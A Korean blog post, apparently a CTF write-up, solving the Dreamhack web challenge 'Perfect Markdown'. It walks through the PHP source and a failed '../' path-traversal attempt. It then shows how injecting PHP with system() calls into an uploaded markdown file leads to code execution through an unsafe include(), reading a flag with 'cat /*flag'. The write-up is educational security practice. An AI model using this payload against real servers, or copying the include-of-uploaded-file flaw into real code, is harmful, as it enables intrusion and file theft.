---
title: "드림핵 lv.1 - Perfect Markdown"
date: 2025-02-27 00:22:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, file traversal] 
description: 드림핵 Perfect Markdown 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/1773](https://dreamhack.io/wargame/challenges/1773)
# 문제 설명
실시간으로 마크다운을 수정해볼 수 있는 페이지입니다.

서비스의 취약점을 찾고 익스플로잇하여 플래그를 획득하세요!

플래그 형식은 DH{...} 입니다.

---
# 문제 풀이 
## 웹사이트 분석
### main page
![perfect markdown main page](https://1drv.ms/i/c/5cb37aa515b56a00/IQTebEcK-TkIRpOvLtvyIIQgATcexgH1wDwGXffUOegksUc?width=660)
<br />
메인 페이지를 살펴보면 파일을 업로드 할 수 있는 form과 그 아래에는 마크다운 예시와 지금까지 업로드된 마크다운 파일들의 리스트를 볼 수 있다. 미리 출제자가 만들어둔 `example.md`를 클릭해보면 다음 페이지로 넘어간다.
### example.md page
![perfect markdown example page](https://1drv.ms/i/c/5cb37aa515b56a00/IQT1861V9IR6Q4YF8p_S5wBiAfR5qBpVr_HN-FCx-a73780?width=660)
<br />
이번 페이지에선 업로드된 해당 파일을 수정하고 저장할 수 있는 인풋 박스가 있고 그 아래에는 해당 마크다운의 미리보기가 있다.

아마 마크다운에 어떠한 코드를 집어넣어서 플래그에 접근할 수 있을 것 같은데 코드를 먼저 분석해보자. 문제 난이도가 낮기 때문에 분명히 인풋으로 들어오는 값들의 필터링이 없거나 부실할 것이다.
## 코드 분석
**코드 구조**
```
deploy/
	- css/
	- uploads/
		- example.md
	- flag
	- DockerFile
	- edit.php
	- index.php
	- post_handler.php
	- save.php
	- upload.php
```
### index.php
```html
<form action="upload.php" method="post" enctype="multipart/form-data">
	<label for="file">Choose Markdown file:</label>
	<input type="file" name="file" id="file" accept=".md">
	<input type="submit" value="Upload">
</form>
```
```php
<?php
$uploads_dir = 'uploads/';
if ($handle = opendir($uploads_dir)) {
	echo "<h2>Uploaded Files</h2><ul>";
	while (false !== ($entry = readdir($handle))) {
		if ($entry != "." && $entry != "..") {
			echo "<li><a href='edit.php?file=" . urlencode($entry) . "'>" . htmlspecialchars($entry) . "</a></li>";
		}
	}
	closedir($handle);
	echo "</ul>";
}
?>
```
```html
<script>
	fetch('post_handler.php')
	.then(response => response.text())
	.then(data => {
		document.getElementById('preview').innerHTML = marked.parse(data);
	});
</script>
```
다른 코드들도 있지만 집중해야 할 부분들만 가져와보았다. <br />

맨 위의 form을 보면 업로드할 때 `upload.php`로 `POST` 요청을 보내는 것을 볼 수 있다. 아래의 두 코드는 마크다운의 preview와 업로드된 파일 리스트를 보여주는 코드이다. 별로 신경쓸 요소는 보이지 않는다.
### post_handler.php
```php
$uploads_dir = 'uploads/';

if ($_SERVER['REQUEST_METHOD'] === 'GET') {

    $file = $_GET['file'] ?? 'example.md';
    $path = $uploads_dir . $file; 

    include($path);

} else {
    echo "Use GET method!!";
}
```
`index.php`의 맨 아래의 스크립트를 보면 `post_handler.php`에서 정보를 가져와 미리보기를 보여주는 부분이 있다. 그래서 "/post_handler.php?file=example.md"에 접속하면 역시나 `example.md` 파일이 담고있는 내용이 출력되는 방식이다.

이를 이용해서 Path Traversal로 ../flag를 출력하려고 했는데, 별의 별 파일 주소를 다 시도해봐도 계속해서 경고만 뜨고 플래그가 출력이 되질 않는다. <br />
`include()` 함수가 원래 ".." 문자열을 파일 주소에서 필터링 하는지 검색해봤는데 그것도 아니었다. 이유는 모르겠으나 일단 이 방법으로 플래그에 접근하는 방법은 막혀있는 듯 하다.

"URL/post_handler.php?file=../"처럼 파일 이름에 "../"만 입력해보면 `include(/var/www/html)`에서 파일을 가져오는 것에 실패하였다고 결과가 나온다. 그렇다는 것은 ".." 제대로 작동을 하고 있다는 의미인데 무슨 이유에서인지 flag 파일이 메인 디렉토리에 없는 듯 하다.

> 지금 보니 문제의 댓글에 보면 나와 똑같이 삽질한 사람을 볼 수 있다...
> 확실하게 flag 파일은 해당 디렉토리에 없다. 문제에서 제공하는 파일 구조와 실제 구조가 약간 다른 상황이다.


### upload.php
```php
$uploads_dir = 'uploads/';
if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $tmp_name = $_FILES['file']['tmp_name'];
    $name = basename($_FILES['file']['name']);
    
    if (pathinfo($name, PATHINFO_EXTENSION) === 'md') {
        move_uploaded_file($tmp_name, "$uploads_dir/$name");
        echo "File uploaded successfully!";
    } else {
        echo "Only .md files are allowed!";
    }
} else {
    echo "File upload error!";
}
```
유저가 파일을 업로드하면 실행되는 코드이다.<br />
해당 코드는 단순하게 받은 파일의 확장자가 .md인지만 확인하는 단순한 행동을 한다.
### edit.php
```html
<h1>Edit Markdown File</h1>
<form action="save.php" method="post">
	<textarea name="content" id="content" rows="20" cols="80">
		<?php
		$uploads_dir = 'uploads/';
	
		if (isset($_GET['file'])) {
			$file = $_GET['file'];
			$path = realpath($uploads_dir . $file);
	
			if (strpos($path, realpath($uploads_dir)) === 0 && file_exists($path)) {
				echo htmlspecialchars(file_get_contents($path));
			} else {
				echo "Invalid file or file not found!";
			}
		} else {
			echo "No file parameter provided!";
		}
		?>
	</textarea>
	<input type="hidden" name="file" value="<?php echo htmlspecialchars($_GET['file']); ?>">
	<input type="submit" value="Save">
</form>
```
`edit.php`는 파일의 이름을 받고 해당 파일을 수정할 수 있게 해주는 페이지이다.<br />
그렇다면 서버에 있는 모든 파일에 접근할 수 있을 것 같아서 시도해보니 그것도 안된다. 아마 `realpath()` 함수가 ".." 문자열을 지우는 기능이 있어서 그런 것 같다. uploads/ 디렉토리가 아니면 접근할 수 없게 해놓았다.
### DockerFile
```
FROM php:7.4-apache

RUN a2enmod rewrite

COPY . /var/www/html/

RUN RANDOM_STR=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32) && \
    mv /var/www/html/flag /${RANDOM_STR}_flag

RUN chmod -R 777 /var/www/html/uploads

EXPOSE 80
```
여기서 치명적인 정보를 하나 발견했다.<br />
서버가 실행될 때 `/var/www/html/` 안에 있던 플래그 파일을 루트 디렉토리로 옮기면서 이름도 랜덤으로 바뀌어진다는 점이다. 이러한 이유로 위에서 시도했던 삽질이 먹히질 않았던 것이다.
## 최종 풀이
여기서 알 수 있는 취약점은 마크 다운 파일을 업로드하면 파일의 내용을 필터링하는 코드가 없다는 점, 그리고 index.php에서 `post_handler.php`에 접근할 때 `post_handler.php`는 `include(example.md)`를 하면서 해당 파일 안에 있는 코드를 실행시킨 다는 점이다.

만약 `example.md` 안에 `system()` 함수를 실행시키는 php 코드가 있다면 `post_handler.php`에서 해당 코드가 실행돼 출력시킬 수 있다는 것이다.
### example.md 수정하기
```php
<?php
system("ls -al");
?>
```
```
* RESULT *
total 52 drwxrwxrwx 1 www-data www-data 4096 Jan 31 05:50 . drwxr-xr-x 1 root root 4096 Nov 15 2022 .. -rw-r--r-- 1 root root 235 Jan 31 05:50 Dockerfile drwxr-xr-x 2 root root 4096 Jan 31 05:50 css -rw-r--r-- 1 root root 1551 Jan 31 05:50 edit.php -rw-r--r-- 1 root root 1496 Jan 31 05:50 index.php -rw-r--r-- 1 root root 222 Jan 31 05:50 post_handler.php -rw-r--r-- 1 root root 510 Jan 31 05:50 save.php -rw-r--r-- 1 root root 449 Jan 31 05:50 upload.php drwxrwxrwx 1 root root 4096 Jan 31 05:50 uploads
```
`example.md`의 내용을 모두 지우고 php 코드를 삽입한 후에 메인 페이지로 돌아가면 preview로 해당 결과가 나오게 된다.<br />
#### 플래그 알아내기
전에 봤듯이 `DockerFile`에 보면 플래그는 루트 디렉토리에 위치해있다. <br />
그래서 php 코드를 간단하게 `cat /*flag`로 변경해주고 메인 페이지로 돌아가면 곧 바로 플래그를 볼 수가 있다.<br />
플래그의 위치를 미리 알아두지 않았다면 모든 디렉토리를 돌아다니면서 귀찮게 찾을뻔 했다.
```
DH{REDACTED}
```
# 배운 것
1. php에서 `include()` 함수를 호출하면 인자로 넘어간 파일이 실행될 수 있다는 것.
2. php에서 `realpath()` 함수는 인자로 넘어간 문자열의 "." 혹은 ".."을 지워버린다는 것.
3. 제공되는 모든 파일은 세심히 살펴봐야할 필요가 있다는 것, 취약점 분석에는 모든 정보가 중요하게 작용한다는 점(`DockerFile`라든가).
